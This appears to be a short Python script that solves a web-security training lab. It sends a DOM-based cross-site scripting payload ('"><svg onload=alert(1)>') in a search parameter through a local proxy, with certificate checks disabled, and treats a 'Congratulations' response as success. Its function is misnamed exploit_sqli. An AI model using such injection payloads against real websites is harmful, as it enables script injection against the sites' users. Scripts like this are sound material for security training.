import requests
import sys
import urllib3

# DOM based XSS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def exploit_sqli(url):
    uri = '/?search="><svg onload=alert(1)>'
    r = requests.get(url + uri, verify=False, proxies=proxies)

    if "Congratulations" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0])
        print('[-] Example: %s www.example.com'% sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url):
        print("[+] DOM XSS successful")
    else:
        print("[-] DOM XSS unsuccessful")